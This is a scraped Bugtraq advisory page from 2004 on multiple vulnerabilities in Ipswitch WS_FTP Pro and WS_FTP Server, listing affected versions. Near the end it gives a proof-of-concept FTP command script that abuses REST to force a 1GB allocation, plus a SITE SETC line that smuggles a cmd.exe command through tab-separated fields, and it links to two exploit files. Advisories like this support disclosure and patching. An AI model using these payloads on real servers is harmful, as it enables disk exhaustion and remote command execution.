#SpeeDr00t@Black Falcon<br>#bid9953<p><b><span style="font-size: 18pt;">Ipswitch WS_FTP Multiple Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/9953/info">info</a><br><a href="http://www.securityfocus.com/bid/9953/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/9953/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/9953/solution">solution</a><br><a href="http://www.securityfocus.com/bid/9953/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				9953
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Unknown
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Mar 23 2004 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Mar 23 2004 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				Discovery is credited to Hugh Mann &lt;hughmann@hotmail.com&gt;.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Ipswitch WS_FTP Pro 8.0 3<br/>
					
				
					Ipswitch WS_FTP Pro 8.0 2<br/>
					
				
					Ipswitch WS_FTP Pro 7.5 <br/>
					
				
					Ipswitch WS_FTP Pro 6.0 <br/>
<span class="related">
						
							-
						
						Microsoft Windows  3.1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 95  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 98  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
					
				
					Ipswitch WS FTP Server 4.0 2<br/>
					
				
					Ipswitch WS FTP Server 4.0 1<br/>
					
				
					Ipswitch WS FTP Server 4.0 <br/>
					
				
					Ipswitch WS FTP Server 3.4 <br/>
					
				
					Ipswitch WS FTP Server 3.1.3 <br/>
					
				
					Ipswitch WS FTP Server 3.1.2 <br/>
					
				
					Ipswitch WS FTP Server 3.1.1 <br/>
					
				
					Ipswitch WS FTP Server 3.1 <br/>
					
				
					Ipswitch WS FTP Server 3.0 1<br/>
					
				
					Ipswitch WS FTP Server 3.0 <br/>
					
				
					Ipswitch WS FTP Server 2.0.4 <br/>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP5<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP4<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP3<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
					
				
					Ipswitch WS FTP Server 2.0.3 <br/>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
					
				
					Ipswitch WS FTP Server 2.0.2 <br/>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
					
				
					Ipswitch WS FTP Server 2.0.1 <br/>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
					
				
					Ipswitch WS FTP Server 2.0 <br/>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
					
				
					Ipswitch WS FTP Server 1.0.5 <br/>
					
				
					Ipswitch WS FTP Server 1.0.4 <br/>
					
				
					Ipswitch WS FTP Server 1.0.3 <br/>
					
				
					Ipswitch WS FTP Server 1.0.2 <br/>
					
				
					Ipswitch WS FTP Server 1.0.1 <br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>#<br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	The following proof of concept has been provided:<br/>Save this in a file called ftpcmds.txt, after changing the FTP server name,<br/>username, and password.<br/><br/>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br/>open ftp.server.mob<br/>username<br/>password<br/>!echo.&gt;2byte.txt<br/>!echo.&gt;2byte_2.txt<br/>dir<br/>put 2byte_2.txt<br/>dir<br/>del 2byte_2.txt<br/>quote REST 1073741822<br/>put 2byte.txt<br/>dir<br/>put 2byte_2.txt<br/>del 2byte.txt<br/>del 2byte_2.txt<br/>!del 2byte.txt<br/>!del 2byte_2.txt<br/>quit<br/>&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<br/><br/>Then start it:<br/><br/>C:\&gt;ftp -s:ftpcmds.txt<br/><br/>to see the result. It will create a 1GB file and then delete it.<br/><br/>SITE SETC &lt;HostName&gt;&lt;\t&gt;3V1L&lt;\t&gt;cmd.exe&lt;\t&gt;/C echo yup&lt;\t&gt;16<br/>        220 site command modified<br/><br/>The following exploit code has been provided:
	
		<ul>
<li><a href="/data/vulnerabilities/exploits/wsftp_allo.cpp">/data/vulnerabilities/exploits/wsftp_allo.cpp</a></li>
<li><a href="/data/vulnerabilities/exploits/wsftp_stat.cpp">/data/vulnerabilities/exploits/wsftp_stat.cpp</a></li>
</ul>
</div>